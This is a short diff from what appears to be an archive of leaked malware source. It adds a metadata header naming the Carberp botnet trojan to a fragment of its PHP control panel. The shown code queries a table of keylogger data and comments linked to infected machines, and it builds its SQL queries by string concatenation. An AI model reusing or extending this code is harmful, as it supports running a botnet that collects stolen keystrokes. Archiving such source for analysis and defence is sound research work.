@@ -1,9 +1,21 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 if(!empty($Cur['id'])){
 	$prog = $mysqli->query('SELECT * FROM bf_keylog_data WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
 
-	if($prog->id == $Cur['id']){		$comment = $mysqli->query('SELECT id,prefix,uid,uniq FROM bf_comments WHERE (prefix=\''.$prog->prefix.'\') AND (uid=\''.$prog->uid.'\') AND (uniq=\''.$prog->hash.'\') AND (type=\'9\') LIMIT 1');
+	if($prog->id == $Cur['id']){
+		$comment = $mysqli->query('SELECT id,prefix,uid,uniq FROM bf_comments WHERE (prefix=\''.$prog->prefix.'\') AND (uid=\''.$prog->uid.'\') AND (uniq=\''.$prog->hash.'\') AND (type=\'9\') LIMIT 1');
 
 		$_POST['text'] = str_replace("'", '', $_POST['text']);
 	    $_POST['text'] = str_replace("\n", '<br />', $_POST['text']);
